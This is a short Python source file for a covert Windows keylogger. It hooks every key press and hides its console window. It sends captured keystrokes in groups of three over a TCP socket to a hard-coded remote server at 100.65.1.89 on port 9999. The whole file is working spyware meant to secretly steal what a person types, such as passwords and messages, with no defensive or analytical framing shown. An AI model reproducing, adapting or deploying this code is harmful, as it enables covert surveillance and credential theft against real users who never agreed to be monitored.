import keyboard 
import socket
import ctypes

keystroke_count = 0

# Server address and port
SERVER_ADDRESS = '100.65.1.89'  # Replace with the server's IP address
SERVER_PORT = 9999  # Must match the server port

# Initialize a list for keystrokes
keystrokes = []

def send_keystrokes_to_server(data):
    """Send keystrokes to the server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((SERVER_ADDRESS, SERVER_PORT))
            s.sendall(data.encode('utf-8'))
        except Exception as e:
            print(f"Error sending data: {e}")

def on_key_event(event):
    global keystrokes
    if event.event_type == 'down':  # Only capture key press events
        keystrokes.append(event.name)  # Append the key name
        
        # Check if we should send keystrokes to the server
        if len(keystrokes) >= 3:
            data_to_send = ' '.join(keystrokes)
            send_keystrokes_to_server(data_to_send)
            keystrokes = []  # Reset after sending

# Hide the console window
ctypes.windll.kernel32.FreeConsole()

# Start the keylogger
try:
    keyboard.hook(on_key_event)  # Hook the key event
    keyboard.wait('esc')  # Wait for the Esc key to exit
except Exception as e:
    print(f"An error occurred: {e}")
